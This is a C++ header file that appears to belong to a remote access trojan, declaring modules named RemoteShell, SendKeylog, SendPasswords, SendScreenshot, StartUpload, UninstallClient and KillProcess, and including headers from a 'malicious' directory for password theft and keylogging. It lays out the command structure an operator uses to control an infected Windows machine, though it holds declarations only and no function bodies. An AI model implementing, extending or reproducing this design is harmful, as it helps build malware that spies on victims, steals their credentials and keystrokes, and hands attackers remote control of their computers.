#ifndef _OPERATING_MODULES_
#define _OPERATING_MODULES_

#include <blaspheme/protocol/ConnectionInfo.hpp>
#include <common/Logger.hpp>
#include <malicious/Passwords.hpp>
#include <malicious/Keylogger.hpp>
#include "ServerAbstractFunction.hpp"

namespace Inhibition
{
    class ProgramStartupKey;
    class Screenshot;

    class RemoteShell : public ServerAbstractFunction
    {
        public:
        
            RemoteShell(Blaspheme::ConnectionInfo& info)
            :cinfo(info)
            {
            }
            
            virtual void operator()();
        
        private:

            Blaspheme::ConnectionInfo& cinfo;
    };

    class BrowseFileTree : public ServerAbstractFunction
    {
        public:
            BrowseFileTree(){}
            virtual void operator()();
    };

    class StartDownload : public ServerAbstractFunction
    {
        public:
        
            StartDownload(){}
            virtual void operator()();
    };

    class StartUpload : public ServerAbstractFunction
    {
        public:
        
            StartUpload(){}
            virtual void operator()();
    };

    class UninstallClient : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class KillClient : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class UpgradeClient : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class RebootClient : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendEmail : public ServerAbstractFunction
    {
        public:
            SendEmail(){}
            virtual void operator()();
    };

    class SendKeylog : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendScreenshot : public ServerAbstractFunction
    {
        public:
            SendScreenshot(Screenshot& screenshooter_ref)
            :screenshooter(screenshooter_ref){}
            virtual void operator()();
        private:
            Screenshot& screenshooter;
    };

    class SendPasswords : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendProcessList : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class KillProcess : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendWindowsVersion : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class SendClientName : public ServerAbstractFunction
    {
        public:
            SendClientName(const Blaspheme::ConnectionInfo& info)
            :cinfo(info)
            {
            }
            
            virtual void operator()();
    
        private:
            
            const Blaspheme::ConnectionInfo& cinfo;
    };

    class Shutdown : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class Reboot : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class Logout : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

    class Hibernate : public ServerAbstractFunction
    {
        public:
            virtual void operator()();
    };

}  /* Inhibition */

#endif // _OPERATING_MODULES_
